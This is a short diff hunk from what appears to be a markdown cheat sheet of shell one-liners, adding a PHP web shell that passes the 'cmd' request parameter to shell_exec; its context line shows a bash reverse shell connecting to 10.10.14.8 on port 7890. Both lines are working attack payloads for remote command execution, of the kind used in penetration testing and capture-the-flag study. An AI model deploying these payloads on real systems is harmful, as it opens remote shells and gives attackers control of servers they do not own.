@@ -26,7 +26,8 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'"):
 ### Oneliner php
 
 ```python
-
+<?php
+ echo "<pre>" . shell_exec($_GET['cmd']) . ""
 ```
 
 ### Oneliner python
